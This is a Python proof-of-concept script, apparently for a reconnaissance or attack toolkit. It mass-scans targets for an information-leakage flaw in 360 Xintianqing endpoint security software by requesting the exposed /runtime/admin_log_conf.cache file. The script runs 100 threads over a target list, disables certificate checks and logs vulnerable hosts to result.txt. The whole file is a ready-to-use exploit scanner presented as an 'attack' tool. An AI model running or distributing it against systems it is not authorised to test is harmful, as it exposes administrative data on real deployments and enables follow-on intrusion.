import argparse,sys,requests,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def main():
    banner()
    parser = argparse.ArgumentParser(description='thin is 360新天擎 information leakage POC')
    parser.add_argument('-u','--url',help='please input you attack url')
    parser.add_argument('-f','--file',help='please input you attack file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8')as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")    
def banner():
    text="""

 _____  ____ _____   _        __                           _   _               _            _                    
|____ |/ ___|  _  | (_)      / _|                         | | (_)             | |          | |                   
    / / /___| |/' |  _ _ __ | |_ ___  _ __ _ __ ___   __ _| |_ _  ___  _ __   | | ___  __ _| | ____ _  __ _  ___ 
    \ \ ___ \  /| | | | '_ \|  _/ _ \| '__| '_ ` _ \ / _` | __| |/ _ \| '_ \  | |/ _ \/ _` | |/ / _` |/ _` |/ _ \
.___/ / \_/ \ |_/ / | | | | | || (_) | |  | | | | | | (_| | |_| | (_) | | | | | |  __/ (_| |   < (_| | (_| |  __/
\____/\_____/\___/  |_|_| |_|_| \___/|_|  |_| |_| |_|\__,_|\__|_|\___/|_| |_| |_|\___|\__,_|_|\_\__,_|\__, |\___|
                                                                                                       __/ |     
                                                                                                      |___/      

"""
    print(text)

def poc(target):
    url = target+'/runtime/admin_log_conf.cache'
    headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)'
    }
    try:
        res = requests.get(url,headers=headers,verify=False,timeout=5)
        if res.status_code==200:
            print(f"[+] {target} Vulnerability exists")
            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target+"\n")
        else:
            print(f"[-] {target} Vulnerability does not exist")
    except:
        print(f"[*] {target} server error")

if __name__=='__main__':
    main()